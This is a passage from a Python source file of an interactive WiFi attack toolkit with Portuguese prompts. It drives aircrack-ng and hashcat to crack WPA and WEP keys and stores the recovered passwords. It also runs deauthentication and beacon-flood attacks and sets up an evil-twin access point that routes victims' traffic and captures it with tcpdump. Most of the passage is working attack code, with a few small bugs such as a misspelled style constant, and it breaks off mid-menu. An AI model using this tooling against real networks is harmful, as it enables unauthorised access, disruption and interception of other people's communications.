        print(f"{Fore.YELLOW}Pressione Ctrl+C para interromper{Style.RESET_ALL}")
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            password_found = False
            start_time = time.time()
            
            for line in iter(process.stdout.readline, ''):
                line = line.strip()
                if line:
                    self._colorize_aircrack_output(line)
                    
                    if 'KEY FOUND' in line:
                        password_found = True
                        password = line.split('[')[-1].split(']')[0]
                        print(f"\n{Fore.GREEN}{'='*80}")
                        print(f"{'SENHA ENCONTRADA!':^80}")
                        print(f"{'='*80}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}Senha: {password}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}Tempo: {time.time() - start_time:.2f} segundos{Style.RESET_ALL}")
                        
                        # Salvar resultado
                        self._save_cracked_password(bssid, password)
                        break
            
            if not password_found:
                print(f"\n{Fore.RED}Senha não encontrada na wordlist{Style.RESET_ALL}")
            
            process.wait()
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Ataque interrompido pelo usuário{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Erro durante ataque: {e}{Style.RESET_ALL}")
    
    def _mask_attack(self, bssid, mask):
        """Ataque por máscara usando hashcat"""
        print(f"\n{Fore.YELLOW}Convertendo para formato hashcat...{Style.RESET_ALL}")
        
        # Converter cap para hccapx
        hccapx_file = f"{self.capture_file}.hccapx"
        
        try:
            result = subprocess.run(
                ['aircrack-ng', self.capture_file, '-J', hccapx_file],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if os.path.exists(hccapx_file):
                # Executar hashcat
                cmd = ['hashcat', '-m', '2500', hccapx_file, mask]
                
                print(f"\n{Fore.YELLOW}Executando hashcat...{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Comando: {' '.join(cmd)}{Style.RESET_ALL}")
                
                subprocess.run(cmd, timeout=3600)
                
                # Verificar resultados
                result_file = f"{hccapx_file}.out"
                if os.path.exists(result_file):
                    with open(result_file, 'r') as f:
                        results = f.read()
                        print(f"\n{Fore.CYAN}Resultados:{Style.RESET_ALL}")
                        print(results)
                else:
                    print(f"{Fore.RED}Nenhuma senha encontrada{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Falha ao converter arquivo{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}Erro no ataque por máscara: {e}{Style.RESET_ALL}")
    
    def _hybrid_attack(self, bssid, wordlist, mask):
        """Ataque híbrido"""
        print(f"\n{Fore.YELLOW}Ataque híbrido - Combinando wordlist com máscara{Style.RESET_ALL}")
        
        # Criar wordlist temporária combinada
        temp_wordlist = f"/tmp/hybrid_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}.txt"
        
        try:
            with open(wordlist, 'r') as f:
                words = [line.strip() for line in f if line.strip()]
            
            # Aplicar máscara
            hybrid_words = []
            for word in words[:10000]:  # Limitar para não explodir memória
                if mask.startswith('?'):
                    # Máscara hashcat style
                    hybrid_words.append(word + self._apply_hashcat_mask(mask))
                else:
                    # Máscara simples
                    hybrid_words.append(word + mask)
            
            # Salvar wordlist temporária
            with open(temp_wordlist, 'w') as f:
                f.write('\n'.join(hybrid_words))
            
            # Executar ataque
            self._dictionary_attack(bssid, temp_wordlist)
            
            # Limpar
            os.remove(temp_wordlist)
            
        except Exception as e:
            print(f"{Fore.RED}Erro no ataque híbrido: {e}{Style.RESET_ALL}")
            if os.path.exists(temp_wordlist):
                os.remove(temp_wordlist)
    
    def _apply_hashcat_mask(self, mask):
        """Aplicar máscara hashcat"""
        # Implementação simplificada
        result = ''
        i = 0
        while i < len(mask):
            if mask[i] == '?':
                i += 1
                if i < len(mask):
                    if mask[i] == 'l':  # letra minúscula
                        result += random.choice('abcdefghijklmnopqrstuvwxyz')
                    elif mask[i] == 'u':  # letra maiúscula
                        result += random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
                    elif mask[i] == 'd':  # dígito
                        result += random.choice('0123456789')
                    elif mask[i] == 's':  # símbolo
                        result += random.choice('!@#$%^&*()')
                    elif mask[i] == 'a':  # qualquer caractere
                        result += random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()')
                    i += 1
            else:
                result += mask[i]
                i += 1
        
        return result
    
    def _colorize_aircrack_output(self, line):
        """Colorir output do aircrack"""
        if 'KEY FOUND' in line:
            print(f"{Fore.GREEN}{line}{Style.RESET_ALL}")
        elif 'Testing key' in line:
            print(f"{Fore.BLUE}{line}{Style.RESET_ALL}")
        elif 'Failed' in line or 'No valid' in line:
            print(f"{Fore.RED}{line}{Style.RESET_ALL}")
        elif 'Progress' in line:
            print(f"{Fore.YELLOW}{line}{Style.RESET_ALL}")
        else:
            print(f"{Fore.WHITE}{line}{Style.RESET_ALL}")
    
    def _save_cracked_password(self, bssid, password):
        """Salvar senha quebrada"""
        result_file = Config.DATABASE_DIR / "cracked_passwords.txt"
        
        with open(result_file, 'a') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] BSSID: {bssid} | Senha: {password}\n")
        
        print(f"{Fore.GREEN}Senha salva em: {result_file}{Style.RESET_ALL}")
    
    def attack_wep(self):
        """Ataque WEP completo"""
        if not self.monitor_interface:
            print(f"{Fore.RED}Interface monitor não configurada!{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'ATAQUE WEP':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Esta função requer:")
        print("1. Rede WEP ativa")
        print("2. Tráfego suficiente (IVs)")
        print("3. Paciência!{Style.RESET_ALL}")
        
        confirm = input(f"\n{Fore.RED}Continuar? (s/n): {Style.RESET_ALL}").strip().lower()
        if confirm != 's':
            return
        
        # Escolher método de ataque
        print(f"\n{Fore.YELLOW}Métodos de ataque WEP:{Style.RRESET_ALL}")
        print("1. Ataque passivo (capturar IVs)")
        print("2. Ataque fake authentication")
        print("3. Ataque ARP request replay")
        print("4. Ataque chop-chop")
        print("5. Ataque fragmentation")
        
        method = input(f"\n{Fore.GREEN}Selecione método [1-5]: {Style.RESET_ALL}").strip()
        
        # Obter informações da rede
        bssid = input(f"{Fore.GREEN}BSSID: {Style.RESET_ALL}").strip().upper()
        channel = input(f"{Fore.GREEN}Canal: {Style.RESET_ALL}").strip()
        essid = input(f"{Fore.GREEN}ESSID (opcional): {Style.RESET_ALL}").strip()
        
        # Executar ataque
        if method == '1':
            self._wep_passive_attack(bssid, channel)
        elif method == '2':
            self._wep_fake_auth(bssid, channel)
        elif method == '3':
            self._wep_arp_replay(bssid, channel)
        elif method == '4':
            self._wep_chopchop(bssid, channel)
        elif method == '5':
            self._wep_fragmentation(bssid, channel)
    
    def _wep_passive_attack(self, bssid, channel):
        """Ataque passivo WEP"""
        print(f"\n{Fore.YELLOW}Ataque passivo - Capturando IVs...{Style.RESET_ALL}")
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        capture_file = Config.CAPTURES_DIR / f"wep_passive_{timestamp}"
        
        # Iniciar airodump-ng
        cmd_airodump = [
            'airodump-ng',
            '--bssid', bssid,
            '-c', channel,
            '-w', str(capture_file),
            '--wep',
            self.monitor_interface
        ]
        
        print(f"{Fore.CYAN}Aguardando IVs suficientes...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Pressione Ctrl+C quando tiver IVs suficientes (10k-50k){Style.RESET_ALL}")
        
        try:
            process = subprocess.Popen(
                cmd_airodump,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            while process.poll() is None:
                try:
                    line = process.stderr.readline()
                    if line:
                        print(f"{Fore.CYAN}{line.strip()}{Style.RESET_ALL}")
                except KeyboardInterrupt:
                    process.terminate()
                    break
            
            # Tentar quebrar com IVs capturados
            self._crack_wep_with_ivs(f"{capture_file}.cap", bssid)
            
        except Exception as e:
            print(f"{Fore.RED}Erro no ataque passivo: {e}{Style.RESET_ALL}")
    
    def _crack_wep_with_ivs(self, capture_file, bssid):
        """Quebrar WEP com IVs capturados"""
        print(f"\n{Fore.YELLOW}Tentando quebrar chave WEP...{Style.RESET_ALL}")
        
        try:
            result = subprocess.run(
                ['aircrack-ng', capture_file, '-b', bssid],
                capture_output=True,
                text=True,
                timeout=300
            )
            
            print(f"{Fore.CYAN}Resultado:{Style.RESET_ALL}")
            print(result.stdout)
            
            if 'KEY FOUND' in result.stdout:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'KEY FOUND' in line:
                        key_part = line.split('KEY FOUND')[1].strip()
                        print(f"\n{Fore.GREEN}{'='*80}")
                        print(f"{'CHAVE WEP ENCONTRADA!':^80}")
                        print(f"{'='*80}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}Chave: {key_part}{Style.RESET_ALL}")
                        
                        # Salvar resultado
                        self._save_cracked_password(bssid, key_part)
                        break
            
        except Exception as e:
            print(f"{Fore.RED}Erro ao quebrar WEP: {e}{Style.RESET_ALL}")
    
    def deauth_attack(self):
        """Ataque de desautenticação"""
        if not self.monitor_interface:
            print(f"{Fore.RED}Interface monitor não configurada!{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'ATAQUE DE DESAUTENTICAÇÃO':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Tipos de ataque:{Style.RESET_ALL}")
        print("1. Desautenticação broadcast (todos os clientes)")
        print("2. Desautenticação cliente específico")
        print("3. Desautenticação contínua")
        print("4. Ataque de beacon flood")
        
        attack_type = input(f"\n{Fore.GREEN}Selecione tipo [1-4]: {Style.RESET_ALL}").strip()
        
        bssid = input(f"{Fore.GREEN}BSSID do AP: {Style.RESET_ALL}").strip().upper()
        
        client_mac = None
        if attack_type in ['2', '3']:
            client_mac = input(f"{Fore.GREEN}MAC do cliente (opcional): {Style.RESET_ALL}").strip().upper()
        
        count = '0'  # 0 = contínuo
        if attack_type != '3':
            count = input(f"{Fore.GREEN}Número de pacotes [0=contínuo, padrão=10]: {Style.RESET_ALL}").strip() or '10'
        
        # Construir comando
        cmd = ['aireplay-ng', '--deauth', count, '-a', bssid]
        
        if client_mac:
            cmd.extend(['-c', client_mac])
        
        cmd.append(self.monitor_interface)
        
        print(f"\n{Fore.RED}ATENÇÃO: Este ataque irá desconectar dispositivos da rede!{Style.RESET_ALL}")
        confirm = input(f"\n{Fore.RED}Continuar? (s/n): {Style.RESET_ALL}").strip().lower()
        
        if confirm != 's':
            return
        
        print(f"\n{Fore.YELLOW}Executando ataque...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Comando: {' '.join(cmd)}{Style.RESET_ALL}")
        
        try:
            if attack_type == '4':
                # Beacon flood
                self._beacon_flood_attack(bssid)
            else:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True
                )
                
                for line in iter(process.stdout.readline, ''):
                    if line.strip():
                        print(f"{Fore.RED}{line.strip()}{Style.RESET_ALL}")
                
                process.wait()
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Ataque interrompido{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Erro no ataque: {e}{Style.RESET_ALL}")
    
    def _beacon_flood_attack(self, bssid):
        """Ataque de beacon flood"""
        print(f"\n{Fore.YELLOW}Iniciando beacon flood...{Style.RESET_ALL}")
        
        # Usar mdk4 para beacon flood
        try:
            cmd = ['mdk4', self.monitor_interface, 'b', '-n', 'FakeNetwork', '-c', '1']
            subprocess.run(cmd, timeout=30)
        except:
            print(f"{Fore.YELLOW}mdk4 não disponível. Usando método alternativo...{Style.RESET_ALL}")
            
            # Método alternativo com aireplay-ng
            essids = ['FreeWiFi', 'PublicWiFi', 'GuestNetwork', 'HotelWiFi', 'AirportWiFi']
            
            for essid in essids:
                cmd = [
                    'aireplay-ng',
                    '--fakeauth', '1',
                    '-e', essid,
                    '-a', bssid,
                    self.monitor_interface
                ]
                subprocess.run(cmd, capture_output=True, timeout=5)
                sleep(1)
    
    def create_fake_ap(self):
        """Criar ponto de acesso falso"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'PONTO DE ACESSO FALSO (Evil Twin)':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Requisitos:")
        print("1. Duas interfaces WiFi (uma para monitor, outra para AP)")
        print("2. Servidor DHCP (dnsmasq)")
        print("3. Gateway configurado{Style.RESET_ALL}")
        
        # Verificar dependências
        dependencies = ['hostapd', 'dnsmasq', 'iptables']
        missing = []
        
        for dep in dependencies:
            result = subprocess.run(['which', dep], capture_output=True)
            if result.returncode != 0:
                missing.append(dep)
        
        if missing:
            print(f"\n{Fore.RED}Faltam dependências: {', '.join(missing)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Instale com: sudo apt install {' '.join(missing)}{Style.RESET_ALL}")
            return
        
        # Configurar AP
        print(f"\n{Fore.YELLOW}Configuração do AP falso:{Style.RESET_ALL}")
        
        interface = input(f"{Fore.GREEN}Interface para AP (ex: wlan1): {Style.RESET_ALL}").strip()
        essid = input(f"{Fore.GREEN}ESSID (nome da rede): {Style.RESET_ALL}").strip() or "FreeWiFi"
        channel = input(f"{Fore.GREEN}Canal [1-14]: {Style.RESET_ALL}").strip() or "6"
        
        # Modo de ataque
        print(f"\n{Fore.YELLOW}Modo de ataque:{Style.RESET_ALL}")
        print("1. AP aberto (captura clara)")
        print("2. AP com portal captivo")
        print("3. AP WPA2 (para handshake)")
        
        mode = input(f"\n{Fore.GREEN}Selecione modo [1-3]: {Style.RESET_ALL}").strip()
        
        # Configurar hostapd
        hostapd_conf = f"""
interface={interface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
        
        if mode == '3':
            password = input(f"{Fore.GREEN}Senha WPA2: {Style.RESET_ALL}").strip() or "password123"
            hostapd_conf += f"""
wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""
        
        hostapd_file = "/tmp/hostapd.conf"
        with open(hostapd_file, 'w') as f:
            f.write(hostapd_conf)
        
        # Configurar dnsmasq
        dnsmasq_conf = f"""
interface={interface}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
"""
        
        dnsmasq_file = "/tmp/dnsmasq.conf"
        with open(dnsmasq_file, 'w') as f:
            f.write(dnsmasq_conf)
        
        print(f"\n{Fore.YELLOW}Iniciando AP falso...{Style.RESET_ALL}")
        
        try:
            # Configurar interface
            subprocess.run(['ifconfig', interface, '10.0.0.1', 'netmask', '255.255.255.0', 'up'], 
                         check=True)
            
            # Iniciar dnsmasq
            dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', dnsmasq_file, '-d'],
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Iniciar hostapd
            hostapd_proc = subprocess.Popen(['hostapd', hostapd_file],
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Configurar iptables para NAT
            subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'],
                         check=True)
            subprocess.run(['iptables', '-A', 'FORWARD', '-i', interface, '-o', 'eth0', '-j', 'ACCEPT'],
                         check=True)
            subprocess.run(['iptables', '-A', 'FORWARD', '-i', 'eth0', '-o', interface, '-j', 'ACCEPT'],
                         check=True)
            
            # Habilitar forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            
            print(f"\n{Fore.GREEN}✓ AP falso iniciado!")
            print(f"  ESSID: {essid}")
            print(f"  IP: 10.0.0.1")
            print(f"  Canal: {channel}{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}Pressione Ctrl+C para parar{Style.RESET_ALL}")
            
            # Capturar tráfego
            if mode == '1':
                self._capture_traffic_from_ap(interface)
            
            # Manter processos rodando
            hostapd_proc.wait()
            dnsmasq_proc.terminate()
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Parando AP falso...{Style.RESET_ALL}")
            
            # Limpar
            subprocess.run(['iptables', '-F'], capture_output=True)
            subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
            
            if 'hostapd_proc' in locals():
                hostapd_proc.terminate()
            if 'dnsmasq_proc' in locals():
                dnsmasq_proc.terminate()
            
            print(f"{Fore.GREEN}AP falso desativado{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}Erro ao criar AP falso: {e}{Style.RESET_ALL}")
    
    def _capture_traffic_from_ap(self, interface):
        """Capturar tráfego do AP falso"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        capture_file = Config.CAPTURES_DIR / f"evil_twin_{timestamp}.pcap"
        
        print(f"\n{Fore.YELLOW}Capturando tráfego...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Arquivo: {capture_file}{Style.RESET_ALL}")
        
        try:
            tcpdump_proc = subprocess.Popen(
                ['tcpdump', '-i', interface, '-w', str(capture_file)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            tcpdump_proc.wait()
        except KeyboardInterrupt:
            if 'tcpdump_proc' in locals():
                tcpdump_proc.terminate()
    
    def packet_injection(self):
        """Injeção de pacotes WiFi"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'INJEÇÃO DE PACOTES WIFI':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Tipos de injeção:{Style.RESET_ALL}")
        print("1. Teste de injeção (aireplay-ng -9)")
        print("2. Injeção de pacotes ARP")
        print("3. Injeção de pacotes personalizados")
        print("4. Teste de taxa de injeção")
        
        choice = input(f"\n{Fore.GREEN}Selecione tipo [1-4]: {Style.RESET_ALL}").strip()
        
        if choice == '1':
            self._test_injection()
        elif choice == '2':
            self._inject_arp_packets()
        elif choice == '3':
            self._inject_custom_packets()
        elif choice == '4':
            self._test_injection_rate()
    
    def _test_injection(self):
        """Testar capacidade de injeção"""
        print(f"\n{Fore.YELLOW}Testando capacidade de injeção...{Style.RESET_ALL}")
        
        try:
            result = subprocess.run(
                ['aireplay-ng', '-9', self.monitor_interface],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            print(f"{Fore.CYAN}Resultado:{Style.RESET_ALL}")
            print(result.stdout)
            
            if 'Injection is working' in result.stdout:
                print(f"{Fore.GREEN}✓ Injeção funcionando!{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}✗ Injeção não está funcionando{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}Erro no teste: {e}{Style.RESET_ALL}")
    
    def monitor_wifi_traffic(self):
        """Monitorar tráfego WiFi"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'MONITORAMENTO DE TRÁFEGO WIFI':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Opções de monitoramento:{Style.RESET_ALL}")
        print("1. Monitor geral (todos os canais)")
        print("2. Monitor específico de BSSID")
        print("3. Monitor de clientes")
        print("4. Monitor de pacotes de dados")
        print("5. Monitor com filtros personalizados")
        
        choice = input(f"\n{Fore.GREEN}Selecione opção [1-5]: {Style.RESET_ALL}").strip()
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_file = Config.CAPTURES_DIR / f"monitor_{timestamp}"
        
        cmd = ['airodump-ng', '-w', str(output_file), '--output-format', 'pcap,csv']
        
        if choice == '2':
            bssid = input(f"{Fore.GREEN}BSSID: {Style.RESET_ALL}").strip()
            if bssid:
                cmd.extend(['--bssid', bssid])
        
        if choice == '3':
            cmd.append('--showack')
        
        if choice == '4':
            cmd.extend(['--berlin', '10'])  # Apenas pacotes de dados
        
        if choice == '5':
            filters = input(f"{Fore.GREEN}Filtros (ex: wlan.fc.type_subtype==0x08): {Style.RESET_ALL}").strip()
            if filters:
                # Usar tshark com filtros
                self._monitor_with_tshark(filters, output_file)
                return
        
        cmd.append(self.monitor_interface)
        
        print(f"\n{Fore.YELLOW}Iniciando monitoramento...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Arquivo: {output_file}.*{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Pressione Ctrl+C para parar{Style.RESET_ALL}")
        
        try:
            subprocess.run(cmd, timeout=None)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Monitoramento interrompido{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Erro no monitoramento: {e}{Style.RESET_ALL}")
    
    def _monitor_with_tshark(self, filters, output_file):
        """Monitorar com tshark e filtros personalizados"""
        cmd = ['tshark', '-i', self.monitor_interface, '-Y', filters, '-w', f"{output_file}.pcap"]
        
        try:
            subprocess.run(cmd, timeout=None)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Monitoramento interrompido{Style.RESET_ALL}")
    
    def analyze_wifi_packets(self):
        """Analisar pacotes WiFi capturados"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'ANÁLISE DE PACOTES WIFI':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        # Listar arquivos de captura
        pcap_files = list(Config.CAPTURES_DIR.glob("*.pcap")) + \
                    list(Config.CAPTURES_DIR.glob("*.cap"))
        
        if not pcap_files:
            print(f"{Fore.RED}Nenhum arquivo de captura encontrado!{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}Arquivos de captura disponíveis:{Style.RESET_ALL}")
        for i, pcap_file in enumerate(pcap_files[:10], 1):
            size = os.path.getsize(pcap_file) / 1024 / 1024
            print(f"{i}. {pcap_file.name} ({size:.2f} MB)")
        
        choice = input(f"\n{Fore.GREEN}Selecione arquivo [1-{len(pcap_files[:10])}]: {Style.RESET_ALL}").strip()
        
        if not choice.isdigit():
            print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
            return
        
        idx = int(choice) - 1
        if not (0 <= idx < len(pcap_files)):
            print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
            return
        
        pcap_file = pcap_files[idx]
        
        print(f"\n{Fore.YELLOW}Análises disponíveis:{Style.RESET_ALL}")
        print("1. Estatísticas básicas")
        print("2. Listar redes encontradas")
        print("3. Listar clientes")
        print("4. Analisar handshakes WPA")
        print("5. Extrair arquivos transmitidos")
        print("6. Buscar informações sensíveis")
        print("7. Reconstruir fluxos TCP")
        
        analysis = input(f"\n{Fore.GREEN}Selecione análise [1-7]: {Style.RESET_ALL}").strip()
        
        if analysis == '1':
            self._basic_packet_stats(pcap_file)
        elif analysis == '2':
            self._list_networks_in_pcap(pcap_file)
        elif analysis == '3':
            self._list_clients_in_pcap(pcap_file)
        elif analysis == '4':
            self._analyze_wpa_handshakes(pcap_file)
        elif analysis == '5':
            self._extract_files_from_pcap(pcap_file)
        elif analysis == '6':
            self._search_sensitive_info(pcap_file)
        elif analysis == '7':
            self._reconstruct_tcp_streams(pcap_file)
    
    def _basic_packet_stats(self, pcap_file):
        """Estatísticas básicas do pcap"""
        print(f"\n{Fore.YELLOW}Estatísticas do arquivo: {pcap_file.name}{Style.RESET_ALL}")
        
        try:
            # Usar tshark para estatísticas
            cmd = ['tshark', '-r', str(pcap_file), '-z', 'io,phs']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            print(f"{Fore.CYAN}{result.stdout}{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}Erro na análise: {e}{Style.RESET_ALL}")
    
    def wifi_coverage_test(self):
        """Teste de cobertura WiFi"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'TESTE DE COBERTURA WIFI':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Este teste mede:")
        print("1. Intensidade do sinal em diferentes pontos")
        print("2. Qualidade da conexão")
        print("3. Velocidade estimada")
        print("4. Melhores canais{Style.RESET_ALL}")
        
        essid = input(f"\n{Fore.GREEN}ESSID da rede para testar: {Style.RESET_ALL}").strip()
        if not essid:
            print(f"{Fore.RED}ESSID é obrigatório!{Style.RESET_ALL}")
            return
        
        duration = input(f"{Fore.GREEN}Duração do teste por ponto (segundos) [padrão: 30]: {Style.RESET_ALL}").strip() or "30"
        points = input(f"{Fore.GREEN}Número de pontos para testar [padrão: 5]: {Style.RESET_ALL}").strip() or "5"
        
        print(f"\n{Fore.YELLOW}Iniciando teste de cobertura...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Vá para cada ponto e pressione Enter quando estiver pronto{Style.RESET_ALL}")
        
        results = []
        
        for i in range(1, int(points) + 1):
            input(f"\n{Fore.GREEN}Ponto {i}/{points} - Posicione-se e pressione Enter...{Style.RESET_ALL}")
            
            print(f"{Fore.YELLOW}Medindo...{Style.RESET_ALL}")
            
            # Medir sinal
            signal_data = self._measure_signal_strength(essid, int(duration))
            results.append({
                'point': i,
                'signal': signal_data.get('signal', -100),
                'quality': signal_data.get('quality', 0),
                'noise': signal_data.get('noise', -100)
            })
            
            print(f"  Sinal: {results[-1]['signal']} dBm")
            print(f"  Qualidade: {results[-1]['quality']}%")
        
        # Analisar resultados
        self._analyze_coverage_results(results, essid)
    
    def _measure_signal_strength(self, essid, duration):
        """Medir força do sinal"""
        try:
            # Usar iwconfig para medir sinal
            cmd = ['iwconfig', self.interface if self.interface else 'wlan0']
            
            for _ in range(duration // 5):
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                
                for line in result.stdout.split('\n'):
                    if essid in line and 'Signal level' in line:
                        # Extrair valor do sinal
                        parts = line.split('Signal level=')
                        if len(parts) > 1:
                            signal_part = parts[1].split()[0]
                            signal = int(signal_part.replace('dBm', ''))
                            
                            # Extrair qualidade se disponível
                            quality = 0
                            if 'Link Quality' in line:
                                quality_part = line.split('Link Quality=')[1].split()[0]
                                if '/' in quality_part:
                                    num, den = map(int, quality_part.split('/'))
                                    quality = int((num / den) * 100)
                            
                            return {'signal': signal, 'quality': quality}
                
                sleep(5)
            
        except Exception as e:
            self.logger.error(f"Erro ao medir sinal: {e}")
        
        return {'signal': -100, 'quality': 0}
    
    def _analyze_coverage_results(self, results, essid):
        """Analisar resultados de cobertura"""
        if not results:
            print(f"{Fore.RED}Nenhum dado coletado!{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'RESULTADOS DA COBERTURA':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Rede: {essid}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'-'*80}{Style.RESET_ALL}")
        
        # Melhor e pior ponto
        best_point = max(results, key=lambda x: x['signal'])
        worst_point = min(results, key=lambda x: x['signal'])
        
        print(f"\n{Fore.GREEN}Melhor ponto: {best_point['point']}")
        print(f"  Sinal: {best_point['signal']} dBm")
        print(f"  Qualidade: {best_point['quality']}%{Style.RESET_ALL}")
        
        print(f"\n{Fore.RED}Pior ponto: {worst_point['point']}")
        print(f"  Sinal: {worst_point['signal']} dBm")
        print(f"  Qualidade: {worst_point['quality']}%{Style.RESET_ALL}")
        
        # Média
        avg_signal = sum(r['signal'] for r in results) / len(results)
        avg_quality = sum(r['quality'] for r in results) / len(results)
        
        print(f"\n{Fore.YELLOW}Média geral:")
        print(f"  Sinal médio: {avg_signal:.1f} dBm")
        print(f"  Qualidade média: {avg_quality:.1f}%{Style.RESET_ALL}")
        
        # Recomendações
        print(f"\n{Fore.CYAN}RECOMENDAÇÕES:{Style.RESET_ALL}")
        
        if avg_signal > -50:
            print("✓ Excelente cobertura")
        elif avg_signal > -70:
            print("✓ Boa cobertura - adequada para uso normal")
        elif avg_signal > -80:
            print("⚠ Cobertura regular - pode ter instabilidades")
        else:
            print("✗ Cobertura ruim - considere repetidores ou mover o roteador")
        
        # Sugestão de canal
        print(f"\n{Fore.YELLOW}Sugestão: Teste canais 1, 6 e 11 para melhor performance{Style.RESET_ALL}")
        
        # Salvar resultados
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        result_file = Config.REPORTS_DIR / f"coverage_{essid}_{timestamp}.json"
        
        with open(result_file, 'w') as f:
            json.dump({
                'essid': essid,
                'timestamp': timestamp,
                'results': results,
                'summary': {
                    'best_point': best_point,
                    'worst_point': worst_point,
                    'average_signal': avg_signal,
                    'average_quality': avg_quality
                }
            }, f, indent=2)
        
        print(f"\n{Fore.GREEN}Resultados salvos em: {result_file}{Style.RESET_ALL}")
    
    def advanced_tools(self):
        """Ferramentas avançadas WiFi"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'FERRAMENTAS AVANÇADAS WIFI':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        while True:
            print(f"\n{Fore.YELLOW}Ferramentas avançadas:{Style.RESET_ALL}")
            print("1.  Analisador de espectro WiFi")
            print("2.  Detector de intrusão WiFi")
            print("3.  Scanner de vulnerabilidades WiFi")
            print("4.  Gerador de wordlists WiFi")
            print("5.  Calculadora de antenas")
            print("6.  Simulador de ataques")
            print("7.  Analisador de metadados")
            print("8.  Voltar")
            
            choice = input(f"\n{Fore.GREEN}Selecione ferramenta [1-8]: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self.wifi_spectrum_analyzer()
            elif choice == '2':
                self.wifi_intrusion_detection()
            elif choice == '3':
